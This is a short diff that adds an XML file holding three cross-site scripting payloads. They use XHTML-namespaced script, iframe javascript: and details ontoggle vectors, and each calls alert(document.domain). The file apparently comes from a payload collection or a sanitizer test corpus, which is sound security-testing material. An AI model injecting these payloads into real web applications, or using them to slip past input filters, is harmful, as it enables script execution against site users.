@@ -1,0 +1,5 @@
+<w xmlns:x="http://www.w3.org/1999/xhtml">
+<x:script>var a=alert;b=document;a(b['domain']);</x:script>
+<x:iframe src="javascript:var a=alert;b=document;a(b['domain']);"></x:iframe>
+<x:details open="open" ontoggle="var a=alert;b=document;a(b['domain']);"></x:details>
+</w>
